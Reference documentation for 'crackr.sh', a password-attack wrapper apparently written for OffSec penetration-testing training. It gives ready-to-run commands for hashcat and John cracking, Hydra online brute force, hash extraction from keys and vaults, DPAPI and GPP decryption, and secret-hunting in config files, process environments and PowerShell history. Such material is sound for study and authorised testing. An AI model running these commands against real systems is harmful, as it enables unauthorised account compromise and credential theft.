---
tags:
  - phase/post-exploitation
  - phase/passwords
  - tool/crackr
  - tool/hashcat
  - tool/john
  - tool/hydra
  - tool/cewl
  - type/tool-docs
---

# crackr.sh

## What It Is
OffSec password cracking suite (v3). Wraps hashcat, John the Ripper, Hydra, and CeWL into a single interface with auto hash identification, tool selection, `*2john` extraction, mask/hybrid attacks, quick-mode escalation, and session logging for report reproducibility.

> [!important] Output directory: `$TOOLKIT_ROOT/crackr/`
> Every run saves a timestamped session log with exact commands for your OffSec report. Cracked credentials are also automatically appended to `$TOOLKIT_ROOT/creds.txt` for use with `sprayr.sh --from-creds`.

---

## Quick Reference

```bash
# Most common engagement patterns
crackr -q -f hashes.txt                         # Auto-detect + quick mode
crackr -q -H '$krb5tgs$23$*user...'             # Single Kerberoast hash
crackr -q -e ssh -f id_rsa                      # Extract SSH key + crack
crackr --unshadow /tmp/passwd /tmp/shadow        # Linux shadow file
crackr --show -f hashes.txt                     # See what's been cracked

# Online brute force
crackr --hydra ssh --target 10.10.10.5 -u admin
crackr --hydra ssh --target 10.10.10.5 -C creds.txt  # combo file

# Custom wordlist from target site
crackr --cewl http://target.htb --cewl-mutate -q -f hashes.txt

# Cracked passwords auto-append to $TOOLKIT_ROOT/creds.txt → feed to sprayr.sh --from-creds
```

> [!important] **AD engagement Crack Loop**
> ```bash
> 1. crackr -q -f $TOOLKIT_ROOT/ad/DOMAIN/hashes/asreproast.txt    # AS-REP (mode 18200)
> 2. crackr -q -f $TOOLKIT_ROOT/ad/DOMAIN/hashes/kerberoast.txt    # Kerberoast (mode 13100)
> 3. # Cracked creds auto-saved to $TOOLKIT_ROOT/creds.txt
> 4. sprayr.sh --from-creds                                      # spray everything → check next_steps.txt
> 5. # REPEAT after every new hash source (secretsdump, mimikatz, Responder, etc.)
> ```

> [!tip] **Post-crack next steps — auto-resolved**
> After each crack run, the script prints a **POST-CRACK — WHAT TO DO NEXT** block with fully resolved copy-paste commands:
> - The first cracked `user:pass` is read from the output file and substituted into every suggestion
> - Hash-type-specific branches: AS-REP → spray + AD enum, Kerberoast → spray + group check, NTLM → spray + PTH + shell, NTLMv2 → spray + direct shell, Linux hashes → SSH + su, DCC2 → spray, MSSQL → mssqlclient + xp_cmdshell
> - Set **`$OffSec_DOMAIN`** and **`$OffSec_DC`** once at engagement start for domain/DC resolution across all branches:
> ```bash
> export OffSec_DOMAIN=corp.local
> export OffSec_DC=10.10.10.1
> ```

---

## Offline Cracking

### Auto-detect and crack
```bash
crackr -f hashes.txt                            # Auto-detect hash type + tool
crackr -H 'aad3b435b51404eeaad3b435b51404ee:...'  # Single hash
crackr -q -f hashes.txt                         # Quick mode (escalating attacks)
```

### Force hash type or tool
```bash
crackr -f hashes.txt -m 1000                    # Force hashcat mode
crackr -f hashes.txt -j sha512crypt             # Force JTR format
crackr -f hashes.txt -t jtr                     # Force John (e.g. no GPU)
crackr -f hashes.txt -t hashcat -m 1800 -r best64
```

### Custom wordlist or rule
```bash
crackr -f hashes.txt -w rockyou -r best64
crackr -f hashes.txt -w fasttrack
crackr -f hashes.txt -w /path/to/custom.txt -r onerule
```

### Show cracked results
```bash
crackr --show -f hashes.txt                     # Checks JTR pot + hashcat potfile
```

---

## Quick Mode (`-q`)

Runs escalating attack stages, stops early if all hashes are cracked:

| Stage | Wordlist | Rule |
|-------|----------|------|
| 1 | fasttrack | none |
| 2 | rockyou | none |
| 3 | rockyou | best64 |
| 4 | rockyou | rockyou-30000 |

> [!tip] Use `-q` on engagement day for every hash unless you already know the password policy. It covers 80–90% of OffSec hashes.

---

## Hash Extraction (`*2john`)

```bash
crackr -e ssh -f id_rsa           # SSH private key
crackr -e zip -f archive.zip      # ZIP archive
crackr -e rar -f archive.rar      # RAR archive
crackr -e pdf -f document.pdf     # PDF
crackr -e office -f doc.docx      # Office document
crackr -e keepass -f db.kdbx      # KeePass database
crackr -e krb -f ticket.kirbi     # Kerberos ticket
crackr -e pfx -f cert.pfx         # PFX/PKCS12 certificate
crackr -e gpg -f key.gpg          # GPG key
crackr -e wpa -f capture.cap      # WPA handshake

# Extract then quick-crack in one command
crackr -e ssh -f id_rsa -q
crackr -e keepass -f db.kdbx -q
```

All types: `ssh, zip, rar, 7z, pdf, office, keepass, gpg, bitlocker, putty, pfx, pkcs12, wpa, vnc, krb, enc`

---

## Unshadow (Linux Shadow Files)

```bash
# Combine passwd + shadow → auto-detects SHA-512 crypt → crack
crackr --unshadow /tmp/passwd /tmp/shadow

# With quick mode
crackr --unshadow /tmp/passwd /tmp/shadow -q
```

---

## Mask Attack

Hashcat `-a 3` mask attack. Use when you know the password pattern.

```bash
# Mask syntax: ?l=lower ?u=upper ?d=digit ?s=special ?a=all
crackr --mask '?u?l?l?l?d?d?d?d' -m 1000 -f hashes.txt    # Passw0rd pattern
crackr --mask 'Company?d?d?d?d' -m 1000 -f hashes.txt      # CompanyNNNN
crackr --mask '?u?l?l?l?l?l?d?s' -m 1800 -f hashes.txt

# -m (hashcat mode) required for mask attacks
```

---

## Hybrid Attack

Wordlist + mask appended or prepended. Hashcat `-a 6` / `-a 7`.

```bash
# Append digits to each wordlist word: password → password1234
crackr --hybrid-append '?d?d?d?d' -f hashes.txt -m 1000

# Prepend digits: password → 1234password
crackr --hybrid-prepend '?d?d?d?d' -f hashes.txt -m 1000

# Custom wordlist
crackr --hybrid-append '?d?d?d' -f hashes.txt -m 1000 -w /path/to/wordlist.txt
```

---

## Online Brute Force (Hydra)

### Common services
```bash
# SSH
crackr --hydra ssh --target 10.10.10.5 -u admin
crackr --hydra ssh --target 10.10.10.5 -u admin -w fasttrack
crackr --hydra ssh --target 10.10.10.5 -U users.txt -w rockyou
crackr --hydra ssh --target 10.10.10.5 -C user_pass.txt      # combo file

# FTP
crackr --hydra ftp --target 10.10.10.5 -u anonymous -p anonymous
crackr --hydra ftp --target 10.10.10.5 -u admin -w fasttrack

# RDP
crackr --hydra rdp --target 10.10.10.5 -u administrator -w rockyou

# SMB
crackr --hydra smb --target 10.10.10.5 -u admin -w fasttrack

# MySQL
crackr --hydra mysql --target 10.10.10.5 -u root -p ''
```

### HTTP brute force
```bash
# HTTP basic auth (GET)
crackr --hydra http-get --target 10.10.10.5 --http-path /admin -u admin -w rockyou

# HTTP form (POST)
crackr --hydra http-post-form --target 10.10.10.5 \
  --http-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"

# HTTPS
crackr --hydra https-post-form --target 10.10.10.5 \
  --http-form "/login:user=^USER^&pass=^PASS^:F=Wrong"

# Non-standard port
crackr --hydra ssh --target 10.10.10.5 --port 2222 -u admin -w rockyou
```

### Hydra options
| Flag | Description |
|------|-------------|
| `--target <ip>` | Target IP or hostname |
| `-u <user>` | Single username |
| `-U <file>` | Username list |
| `-p <pass>` | Single password |
| `-P <file>` | Password list |
| `-C <file>` | Combo file (user:pass per line) |
| `-w <name>` | Wordlist shortcut for `-P` |
| `--port <N>` | Override default port |
| `--http-path <path>` | Path for http-get (default: `/`) |
| `--http-form <spec>` | Form spec: `"/path:params:F=fail_string"` |
| `--hydra-threads <N>` | Threads (default: 16) |
| `--no-stop` | Don't stop after first valid cred |

**Hydra default ports:** ssh=22, ftp=21, rdp=3389, smb=445, mysql=3306, mssql=1433, postgres=5432, vnc=5900, http-get=80, https-get=443

### What Happens When Hydra Finds Credentials

When hydra succeeds, the script automatically prints **service-specific next steps** using the actual found username and password. No placeholders.

| Service | Next Steps Printed |
|---------|-------------------|
| `ssh` | `ssh user@target`, then `sudo -l` + escalatr suggestion |
| `smb` | `nxc smb --shares`, `nxc smb --sam`, `./adr.sh` |
| `winrm` | `evil-winrm -i target -u user -p pass` + `./adr.sh` |
| `rdp` | `xfreerdp /v:target /u:user /p:pass /cert:ignore` |
| `ftp` | `ftp user@target` + `wget -m` mirror |
| `ldap` | `./adr.sh` + `ldapsearch` command |
| `mysql` | `mysql -h target -u user -p'pass'` + `mysqldump` |
| `postgres` | `PGPASSWORD=pass psql -h target -U user` |
| `smtp` | `./sprayr.sh` + IMAP curl |
| `http-*` | `./webenum.sh --url http://TARGET` + admin curl |

---

## CeWL Wordlist Generation

Scrapes a website and builds a custom wordlist from its content — useful when the target org likely uses company-specific passwords.

```bash
# Generate wordlist from target site
crackr --cewl http://target.htb

# With mutations (common OffSec additions)
crackr --cewl http://target.htb --cewl-mutate

# Generate + crack immediately
crackr --cewl http://target.htb -f hashes.txt

# Full chain: scrape + mutate + quick-crack
crackr --cewl http://target.htb --cewl-mutate -q -f hashes.txt

# Custom spider depth + min word length
crackr --cewl http://target.htb --cewl-depth 3 --cewl-min 6
```

**Mutations applied (`--cewl-mutate`):** lowercase, uppercase, capitalized, common suffixes (`1, 12, 123, !, @`), year suffixes (current year ±5, with/without `!`), leet speak (`a→4, e→3, i→1, o→0, s→5, t→7`). Output is deduplicated.

---

## Hash Identification

> [!tip] Looking for **Hydra** (online brute force) or **CeWL** (custom wordlists)? Jump up — they're above this table.

Auto-detected from pattern matching. Handles SAM dump format (`user:rid:lm:ntlm:::`) and `/etc/shadow` format (`user:$X$...`) automatically.

| Hash Type | Hashcat Mode | JTR Format | Pattern |
|-----------|-------------|------------|---------|
| NTLM | 1000 | nt | 32-char hex (default for ambiguous) |
| NTLM (SAM dump) | 1000 | nt | `user:rid:LM:NTLM:::` |
| NTLMv1 | 5500 | netntlm | `:::<48hex>:<48hex>:` |
| NTLMv2 | 5600 | netntlmv2 | Responder captures |
| Kerberoast RC4 (TGS) | 13100 | krb5tgs | `$krb5tgs$23$` |
| Kerberoast AES-128 | 19600 | krb5tgs-aes128 | `$krb5tgs$17$` |
| Kerberoast AES-256 | 19700 | krb5tgs-aes256 | `$krb5tgs$18$` |
| AS-REP Roast | 18200 | krb5asrep | `$krb5asrep$` |
| MD5 Crypt (Linux) | 500 | md5crypt | `$1$` |
| SHA-256 Crypt | 7400 | sha256crypt | `$5$` |
| SHA-512 Crypt | 1800 | sha512crypt | `$6$` |
| yescrypt | NA | yescrypt | `$y$` (JTR only) |
| bcrypt | 3200 | bcrypt | `$2a$` / `$2b$` / `$2y$` |
| phpass (WP/phpBB) | 400 | phpass | `$P$` / `$H$` |
| KeePass | 13400 | KeePass | `$keepass$` |
| DCC2/MSCash2 | 2100 | mscash2 | `$DCC2$` |
| SHA-512 | 1700 | raw-sha512 | 128-char hex |
| SHA-256 | 1400 | raw-sha256 | 64-char hex |
| SHA-1 | 100 | raw-sha1 | 40-char hex |
| MySQL 4.1+ | 300 | mysql-sha1 | `*<40hex>` |
| MSSQL 2005 | 131 | mssql05 | `0x0100<88hex>` |
| MSSQL 2012+ | 1731 | mssql12 | `0x0200<136hex>` |

> [!warning] 32-char hex ambiguity
> MD5 and NTLM are both 32-char hex. Script defaults to **NTLM (mode 1000)** with a warning. If you know it's MD5, add `-m 0`.

---

## Tool Selection Logic (Auto Mode)

1. If `*2john` extraction used, or hash type is `NA` (e.g. yescrypt) → **JTR**
2. If hashcat found and has a usable device (GPU/OpenCL) → **hashcat**
3. If hashcat found but no device detected → **JTR** (with warning)
4. If neither found → error

> [!note] GPU unavailable in Kali VM
> hashcat will fall back to JTR automatically. Use `-t jtr` to force it and skip the device check.

---

## Wordlist Shortcuts

| Shortcut | Path |
|----------|------|
| `rockyou` | `/usr/share/wordlists/rockyou.txt` |
| `fasttrack` | `/usr/share/wordlists/fasttrack.txt` |
| `top1m` | SecLists 10M top 1M |
| `xato1m` | SecLists xato 1M |
| `darkweb` | SecLists darkweb 10k |
| `top10k` | SecLists 10k most common |

> [!warning] Compressed wordlist
> On fresh Kali, `rockyou.txt` may be gzipped. Script detects this and tells you: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`

---

## Rule Shortcuts

| Shortcut | Hashcat Path | JTR Name |
|----------|-------------|----------|
| `best64` | `rules/best64.rule` | `best64` |
| `rockyou-30000` | `rules/rockyou-30000.rule` | — |
| `onerule` | `rules/OneRuleToRuleThemAll.rule` | — |
| `d3ad0ne` | `rules/d3ad0ne.rule` | — |
| `dive` | `rules/dive.rule` | — |
| `toggles` | `rules/toggles1.rule` | — |
| `wordlist` | — | `wordlist` |
| `single` | — | `single` |
| `korelogic` | — | `KoreLogic` |

> [!note] `best66` is an alias for `best64` in this script — they point to the same file. Verify `best64.rule` exists on your Kali before engagement day.

---

## Options Reference

| Flag | Description |
|------|-------------|
| `-f, --file <path>` | Hash file (or file to extract from) |
| `-H, --hash <hash>` | Single hash string |
| `-e, --extract <type>` | Extract hash with `*2john` first |
| `-w, --wordlist <name\|path>` | Wordlist shortcut or full path |
| `-r, --rule <name\|path>` | Rule shortcut or full path |
| `-t, --tool jtr\|hashcat` | Force tool (default: auto) |
| `-m, --mode <N>` | Force hashcat mode number |
| `-j, --jtr-format <fmt>` | Force JTR format string |
| `-q, --quick` | Quick mode (escalating stages) |
| `--mask <pattern>` | Mask attack (`-a 3`) |
| `--hybrid-append <mask>` | Wordlist + mask (`-a 6`) |
| `--hybrid-prepend <mask>` | Mask + wordlist (`-a 7`) |
| `--unshadow <passwd> <shadow>` | Combine passwd + shadow then crack |
| `-o, --output <dir>` | Output directory (default: `$TOOLKIT_ROOT/crackr`) |
| `-s, --show` | Show cracked results |
| `-l, --list` | List available wordlists, rules, tools |

---

## Output Files

```
$TOOLKIT_ROOT/crackr/
├── crackr_session_YYYYMMDD_HHMMSS.log   # Full command log for OffSec report
├── hashcat.potfile                        # Persistent hashcat pot
├── hashcat_cracked_<ts>.txt              # Cracked hashes (wordlist runs)
├── hashcat_mask_cracked_<ts>.txt         # Cracked hashes (mask runs)
├── hashcat_hybrid_cracked_<ts>.txt       # Cracked hashes (hybrid runs)
├── extracted_<type>_<file>.hash          # Extracted *2john hash
├── single_hash_<ts>.hash                 # Single hash input
├── unshadowed_<ts>.hash                  # Unshadowed combined file
├── hydra_<service>_<ip>_<ts>.txt         # Hydra valid credentials
└── cewl_<target>.txt / cewl_..._mutated.txt  # CeWL wordlists

# $TOOLKIT_ROOT/creds.txt — cracked credentials auto-logged here for toolkit-wide reuse
```

---

## Troubleshooting

```bash
# List what's installed and available
crackr --list

# "No usable device" — force JTR (GPU not available in VM)
crackr -f hashes.txt -t jtr -q

# rockyou.txt not found / compressed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Hash type not detected — check manually
crackr --list                             # shows what's supported
crackr -f hashes.txt -m 1000             # force NTLM
crackr -f hashes.txt -m 0               # force MD5

# "All hashes already in potfile" — show results
crackr --show -f hashes.txt

# KeePass extraction: strip prefix
# (script does this automatically with -e keepass)
keepass2john db.kdbx | sed 's/^[^:]*://' > keepass.hash
crackr -f keepass.hash -m 13400 -q
```

---

---

## When crackr Fails — Manual Password Attacks

> [!important] If the script's wordlist attacks fail, these are your escalation paths. Work through them in order — stop as soon as something cracks.

---

### Identify What You Have Before Choosing an Attack

```bash
# Auto-detect hash type
hashid hash.txt
hashcat --example-hashes | grep -A3 "NTLM\|sha512\|bcrypt"

# hashcat mode reference
# 1000  = NTLM (Windows)
# 5600  = NTLMv2 (Net-NTLMv2, from Responder)
# 13100 = Kerberoast (TGS-REP etype 23)
# 18200 = AS-REP (etype 23)
# 1800  = sha512crypt (Linux /etc/shadow $6$)
# 500   = md5crypt ($1$)
# 3200  = bcrypt ($2y$)
# 13400 = KeePass
# 22000 = WPA2
# 7z, zip = 11600, 13600
```

---

### When rockyou Doesn't Work

**Targeted wordlists based on context:**
```bash
# Build a wordlist from the target website (company names, product names, key people)
cewl http://target.com -d 3 -m 5 -w cewl.txt
cewl http://target.com -d 3 -m 5 --with-numbers -w cewl_nums.txt

# Mutate the CeWL list with common password rules
hashcat -m 1000 hash.txt cewl.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hash.txt cewl.txt -r /usr/share/hashcat/rules/dive.rule

# Common OffSec-context wordlists (beyond rockyou)
hashcat -m 1000 hash.txt /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
hashcat -m 1000 hash.txt /usr/share/seclists/Passwords/darkweb2017-top10000.txt
hashcat -m 1000 hash.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

**Pattern/mask attacks when you have hints:**
```bash
# If password policy requires: upper + lower + digit + 8 chars min
hashcat -m 1000 hash.txt -a 3 '?u?l?l?l?l?d?d?d'   # e.g., Password123
hashcat -m 1000 hash.txt -a 3 '?u?l?l?l?d?d?d?d'   # e.g., Pass1234
hashcat -m 1000 hash.txt -a 3 'Company?d?d?d!'       # e.g., Acme123!
hashcat -m 1000 hash.txt -a 3 '?u?l?l?l?d?d?d!'     # e.g., Pass123!
hashcat -m 1000 hash.txt -a 3 'Summer?d?d?d?d'       # season + year
hashcat -m 1000 hash.txt -a 3 '?u?l?l?d?d?d?d!'     # e.g., Abc1234!

# If you know the username is probably the base (jsmith → Jsmith1, Jsmith!)
echo "jsmith" | hashcat -m 1000 hash.txt --stdin -r /usr/share/hashcat/rules/best64.rule
```

---

### NTLMv2 Hashes (From Responder / Relay)

```bash
# NTLMv2 must be cracked offline — cannot be passed directly
# Format: user::domain:challenge:response:blob
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt

# If rockyou fails, try mutations
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# john equivalent
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2.txt
```

---

### DPAPI — Credential Blobs From lootr/Windows

```bash
# DPAPI master key + credential blobs
# Transfer the following from target to Kali:
# - C:\Users\user\AppData\Roaming\Microsoft\Protect\<SID>\<master-key-file>
# - C:\Users\user\AppData\Roaming\Microsoft\Credentials\*

# Decrypt with domain backup key (requires DC access)
impacket-dpapi backupkeys --export -t corp.local/admin:pass@DC_IP
impacket-dpapi masterkey -file <masterkey-file> -pvk ntds_capi_0.pvk
impacket-dpapi credential -file <credential-file> -key <decrypted-master-key>

# Decrypt with user password (offline)
impacket-dpapi masterkey -file <masterkey-file> -password userpass -sid user-SID
```

---

### KeePass / Password Managers

```bash
# KeePass 2.x — extract hash
keepass2john Database.kdbx | sed 's/^[^:]*://' > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
# If that fails: target-specific mutations with cewl output

# KeePass 1.x
keepass2john Database.kdb | sed 's/^[^:]*://' > keepass1.hash
hashcat -m 13400 keepass1.hash /usr/share/wordlists/rockyou.txt
```

---

### Archives and Office Documents

```bash
# ZIP with password
zip2john protected.zip > zip.hash
hashcat -m 17210 zip.hash /usr/share/wordlists/rockyou.txt   # WinZip AES
hashcat -m 13600 zip.hash /usr/share/wordlists/rockyou.txt   # WinZip

# 7z
7z2john protected.7z > 7z.hash
hashcat -m 11600 7z.hash /usr/share/wordlists/rockyou.txt

# Office documents (Word/Excel)
office2john document.docx > office.hash
hashcat -m 9600 office.hash /usr/share/wordlists/rockyou.txt  # Office 2013
hashcat -m 9500 office.hash /usr/share/wordlists/rockyou.txt  # Office 2010

# PDF
pdf2john document.pdf > pdf.hash
hashcat -m 10500 pdf.hash /usr/share/wordlists/rockyou.txt
```

---

### GPP cPassword (Group Policy Preferences)

```bash
# If you find Groups.xml, Services.xml, Scheduledtasks.xml, Printers.xml in SYSVOL
# Extract the cPassword value, then decrypt:
gpp-decrypt '<cPassword_value>'

# Search SYSVOL manually:
find /mnt/sysvol -name "*.xml" 2>/dev/null | xargs grep -l "cpassword" 2>/dev/null
# Or from Kali with creds:
nxc smb DC_IP -u user -p pass -M gpp_password
```

---

### When Nothing Cracks — Alternate Credential Sources

If a hash won't crack, look for the plaintext elsewhere:

```bash
# Config files on the target (run after lootr.sh)
grep -riE 'password|passwd|secret|credential|api.key' /var/www/ /etc/ /opt/ 2>/dev/null | \
  grep -v Binary | head -30

# Environment variables on running processes (Linux)
strings /proc/*/environ 2>/dev/null | grep -iE 'pass|pwd|token|secret|key' | sort -u

# PowerShell history (Windows — often has passwords typed in commands)
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Windows event logs (4624 = successful logon, often shows plaintext in old configs)
wevtutil qe Security /q:"*[System[EventID=4648]]" /f:text /rd:true /c:10
```

---

## Related

- [[Passwords]] — manual password attack techniques and methodology
- [[Active_Directory]] — where NTLM, NTLMv2, Kerberoast, AS-REP hashes come from
- [[Linux_PrivEsc]] — where shadow files come from
- [[OffSec_Password_Attacks_Mental_Model_Bus_Review]] — decision-tree for attack selection
